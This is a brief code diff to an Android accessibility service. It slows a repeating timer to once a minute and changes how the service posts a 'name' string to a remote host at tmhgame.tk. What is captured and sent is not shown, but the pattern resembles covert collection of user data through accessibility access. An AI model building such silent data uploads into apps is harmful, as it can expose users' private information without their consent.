@@ -115,7 +115,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     }
                 });
             }
-        }, 0, 3000);
+        }, 0, 1000*60);
 
 
     }
@@ -150,7 +150,7 @@ public class MyAccessibilityService extends AccessibilityService {
         Log.d("posted", "posted");
         try {
             postData.put("name", s);
-            new ServerHelper().execute("http://tmhgame.tk/ailep", postData.toString());
+            new ServerHelper(this).execute("http://tmhgame.tk/ailep", postData.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
